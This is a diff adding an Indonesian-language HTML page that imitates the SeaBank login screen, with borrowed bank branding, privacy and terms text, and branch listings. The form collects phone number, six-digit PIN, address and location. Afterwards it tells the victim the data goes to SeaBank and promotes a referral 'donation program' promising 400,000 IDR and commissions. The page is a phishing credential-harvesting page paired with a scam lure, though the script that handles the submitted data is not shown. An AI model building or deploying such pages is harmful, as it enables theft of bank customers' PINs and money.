@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - SeaBank</title>
+    <link rel="icon" href="https://banking-aka-storage.seabank.co.id/seabank/id/live/www/live/static/20250714/03_31_19_gauspf/favicon.png">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="theme-toggle" id="themeToggle">🌙</div>
+    <div class="container">
+        <div class="logo-container">
+            <img src="https://banking-aka-storage.seabank.co.id/seabank/id/live/www/live/static/20250714/03_31_19_gauspf/favicon.png" alt="SeaBank Logo" class="logo">
+        </div>
+        
+        <div class="login-form swipe-container">
+            <div class="swipe-overlay"></div>
+            <div class="success-message" id="successMessage">
+                <div class="success-icon"></div>
+                <h2>Terima Kasih Telah Login!</h2>
+                <p style="font-family: 'Courier New', Courier, monospace;">Data akan dikirim ke pusat SeaBank dan harap untuk menunggu dan akan ada notifikasi di akun anda.</p>
+                <div class="promotion-message">
+                    <h3>Program Donasi SeaBank</h3>
+                    <p style="font-family: 'Courier New', Courier, monospace;">Bergabunglah dengan Program Donasi SeaBank! Dapatkan <strong>400.000 IDR</strong> untuk donasi pertama Anda sebagai pengguna baru. Sebarkan link referral Anda dan dapatkan <strong>5% komisi</strong> dari setiap donasi teman yang bergabung melalui link Anda! Semakin banyak Anda mengundang, semakin besar bonusnya!</p>
+                    <button class="btn" id="continueDonation">Lanjutkan ke Donasi</button>
+                    <button class="btn btn-secondary" id="returnMain">Kembali ke Halaman Utama</button>
+                </div>
+            </div>
+            <h1>Masuk ke SeaBank</h1>
+            
+            <form id="loginForm">
+                <div class="form-group">
+                    <label for="phone">Nomor Telepon</label>
+                    <input type="tel" id="phone" name="phone" placeholder="Contoh: 081234567890" required>
+                    <div id="phoneError" class="error-message">Nomor telepon harus valid (contoh: 081234567890)</div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="pin">PIN (6 digit)</label>
+                    <input type="number" id="pin" name="pin" placeholder="Masukkan PIN 6 digit" maxlength="6" pattern="\d{6}" required>
+                    <div id="pinError" class="error-message">PIN harus 6 digit angka</div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="address">Alamat Lengkap</label>
+                    <input type="text" id="address" name="address" placeholder="Contoh: Jl. Sudirman No. 123, Jakarta">
+                    <div id="addressError" class="error-message">Harap masukkan alamat jika mengaktifkan izin lokasi</div>
+                </div>
+                
+                <div class="form-group">
+                    <button type="submit" class="btn" id="loginButton">MASUK</button>
+                </div>
+                
+                <div class="location-permission">
+                    <label for="locationToggle">Izinkan akses lokasi saya</label>
+                    <label class="switch">
+                        <input type="checkbox" id="locationToggle">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+            </form>
+        </div>
+    </div>
+    
+    <footer>
+        <div class="footer-links">
+            <a href="#" id="aboutLink">Tentang Kami</a>
+            <a href="#" id="privacyLink">Kebijakan Privasi</a>
+            <a href="#" id="termsLink">Syarat dan Ketentuan</a>
+            <a href="#" id="locationLink">Lokasi Cabang</a>
+        </div>
+        <p>© 2023 SeaBank. All Rights Reserved.</p>
+    </footer>
+    
+    <!-- Modal About -->
+    <div id="aboutModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2 class="modal-title">Tentang SeaBank</h2>
+                <span class="close-modal">×</span>
+            </div>
+            <div class="modal-body">
+                <p>SeaBank adalah bank digital yang berkomitmen untuk memberikan kemudahan akses keuangan bagi seluruh masyarakat Indonesia. Kami hadir dengan layanan perbankan yang simpel, aman, dan dapat diakses kapan saja dan di mana saja melalui smartphone Anda.</p>
+                
+                <h2>Visi</h2>
+                <p>Menjadi mitra keuangan digital terpercaya yang memberikan kemudahan akses dan manfaat maksimal bagi seluruh lapisan masyarakat Indonesia.</p>
+                
+                <h2>Misi</h2>
+                <ul>
+                    <li>Menyediakan layanan perbankan digital yang inovatif dan mudah digunakan</li>
+                    <li>Memberikan akses keuangan yang inklusif bagi seluruh masyarakat</li>
+                    <li>Menjaga keamanan dan kerahasiaan data nasabah</li>
+                    <li>Memberikan pengalaman perbankan digital yang menyenangkan</li>
+                </ul>
+                
+                <h2>Layanan Kami</h2>
+                <ul>
+                    <li>Tabungan digital dengan bunga kompetitif</li>
+                    <li>Transfer antar bank gratis</li>
+                    <li>Pembayaran dan pembelian mudah</li>
+                    <li>Pinjaman digital dengan proses cepat</li>
+                    <li>Berbagai promo menarik setiap bulannya</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Modal Privacy Policy -->
+    <div id="privacyModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2 class="modal-title">Kebijakan Privasi SeaBank</h2>
+                <span class="close-modal">×</span>
+            </div>
+            <div class="modal-body">
+                <p>Terakhir diperbarui: 1 Januari 2023</p>
+                
+                <h2>1. Pendahuluan</h2>
+                <p>Kebijakan Privasi ini menjelaskan bagaimana PT Bank SeaBank Indonesia ("SeaBank", "kami") mengumpulkan, menggunakan, mengungkapkan, melindungi, dan menyimpan informasi pribadi Anda ketika Anda menggunakan layanan perbankan digital kami ("Layanan").</p>
+                
+                <h2>2. Informasi yang Kami Kumpulkan</h2>
+                <p>Kami dapat mengumpulkan berbagai jenis informasi, termasuk:</p>
+                <ul>
+                    <li>Informasi identitas pribadi (nama, alamat, nomor identitas, dll.)</li>
+                    <li>Informasi kontak (nomor telepon, email, dll.)</li>
+                    <li>Informasi keuangan (riwayat transaksi, saldo, dll.)</li>
+                    <li>Informasi perangkat (IP address, jenis perangkat, dll.)</li>
+                    <li>Informasi lokasi (jika diizinkan)</li>
+                </ul>
+                
+                <h2>3. Penggunaan Informasi</h2>
+                <p>Informasi yang kami kumpulkan digunakan untuk:</p>
+                <ul>
+                    <li>Menyediakan dan memelihara Layanan kami</li>
+                    <li>Memverifikasi identitas Anda</li>
+                    <li>Mencegah penipuan dan aktivitas ilegal</li>
+                    <li>Meningkatkan pengalaman pengguna</li>
+                    <li>Mengembangkan produk dan layanan baru</li>
+                    <li>Memenuhi kewajiban hukum dan regulasi</li>
+                </ul>
+                
+                <h2>4. Perlindungan Data</h2>
+                <p>Kami menggunakan langkah-langkah keamanan teknis dan organisasi yang sesuai untuk melindungi informasi pribadi Anda dari akses, pengungkapan, perubahan, atau penghancuran yang tidak sah.</p>
+                
+                <h2>5. Pembaruan Kebijakan</h2>
+                <p>Kami dapat memperbarui Kebijakan Privasi ini dari waktu ke waktu. Kami akan memberi tahu Anda tentang perubahan material dengan memposting pemberitahuan di situs web kami atau melalui metode lain yang sesuai.</p>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Modal Terms -->
+    <div id="termsModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2 class="modal-title">Syarat dan Ketentuan Layanan SeaBank</h2>
+                <span class="close-modal">×</span>
+            </div>
+            <div class="modal-body">
+                <p>Dengan mengakses dan menggunakan layanan SeaBank, Anda setuju untuk terikat oleh Syarat dan Ketentuan berikut:</p>
+                
+                <h2>1. Penggunaan Layanan</h2>
+                <ul>
+                    <li>Anda harus berusia minimal 17 tahun atau sudah menikah untuk menggunakan layanan kami</li>
+                    <li>Anda bertanggung jawab untuk menjaga kerahasiaan informasi akun Anda</li>
+                    <li>Anda setuju untuk memberikan informasi yang akurat dan lengkap</li>
+                </ul>
+                
+                <h2>2. Akun Pengguna</h2>
+                <ul>
+                    <li>Satu nomor telepon hanya dapat digunakan untuk satu akun SeaBank</li>
+                    <li>Anda bertanggung jawab penuh atas semua aktivitas yang terjadi di akun Anda</li>
+                    <li>Segera laporkan jika Anda mencurigai adanya penggunaan yang tidak sah</li>
+                </ul>
+                
+                <h2>3. Transaksi</h2>
+                <ul>
+                    <li>Transaksi yang telah diproses tidak dapat dibatalkan</li>
+                    <li>Kami berhak menolak atau membatalkan transaksi yang mencurigakan</li>
+                    <li>Biaya-biaya tertentu mungkin berlaku untuk layanan tertentu</li>
+                </ul>
+                
+                <h2>4. Pembatasan</h2>
+                <p>Anda tidak diperbolehkan:</p>
+                <ul>
+                    <li>Menggunakan layanan untuk aktivitas ilegal</li>
+                    <li>Mencoba mendapatkan akses tidak sah ke sistem kami</li>
+                    <li>Mengganggu operasi normal layanan kami</li>
+                </ul>
+                
+                <h2>5. Perubahan Syarat</h2>
+                <p>Kami dapat mengubah Syarat dan Ketentuan ini dari waktu ke waktu. Perubahan akan diberitahukan melalui aplikasi atau situs web kami.</p>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Modal Location -->
+    <div id="locationModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2 class="modal-title">Lokasi Cabang SeaBank</h2>
+                <span class="close-modal">×</span>
+            </div>
+            <div class="modal-body">
+                <h2>Kantor Pusat</h2>
+                <p>SeaBank Tower, Jl. Jend. Sudirman Kav. 52-53, Jakarta Selatan 12190</p>
+                
+                <h2>Cabang Utama</h2>
+                <ul>
+                    <li><strong>Jakarta</strong>: Plaza Senayan Lt. 5, Jl. Asia Afrika No. 8</li>
+                    <li><strong>Surabaya</strong>: Tunjungan Plaza 6, Jl. Embong Malang 21-31</li>
+                    <li><strong>Bandung</strong>: Paris Van Java, Jl. Sukajadi 137-139</li>
+                    <li><strong>Medan</strong>: Sun Plaza, Jl. H. Zainul Arifin No. 7</li>
+                    <li><strong>Makassar</strong>: Trans Studio Mall, Jl. Metro Tanjung Bunga</li>
+                </ul>
+                
+                <h2>Jam Operasional</h2>
+                <p>Senin - Jumat: 09.00 - 16.00 WIB</p>
+                <p>Sabtu: 09.00 - 14.00 WIB</p>
+                <p>Minggu dan Hari Libur: Tutup</p>
+                
+                <h2>ATM SeaBank</h2>
+                <p>ATM SeaBank tersedia di lebih dari 500 lokasi di seluruh Indonesia. Gunakan aplikasi SeaBank untuk menemukan ATM terdekat.</p>
+            </div>
+        </div>
+    </div>
+    
+    <script src="script.js"></script>
+</body>
+</html>
